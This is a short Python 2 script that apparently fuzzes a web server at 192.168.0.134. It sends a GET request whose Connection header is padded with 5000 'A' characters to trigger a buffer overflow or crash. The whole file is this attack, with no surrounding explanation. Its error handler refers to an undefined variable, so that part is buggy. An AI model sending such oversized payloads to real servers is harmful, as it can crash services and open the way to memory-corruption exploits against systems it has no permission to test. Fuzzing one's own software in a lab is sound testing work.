#!/usr/bin/python



import socket
import sys


junk = "A"*5000



req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.0.134\r\n"
req += "Connection:" + junk + "\r\n"
req += "\r\n"


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',80))
    print "Sendin Payload......"
    s.send(req)
    s.recv(1024)
    s.close()
	
except: 
       print("Fuzzing Crashed at %s by" % str(len(buffer)))
       sys.exit() 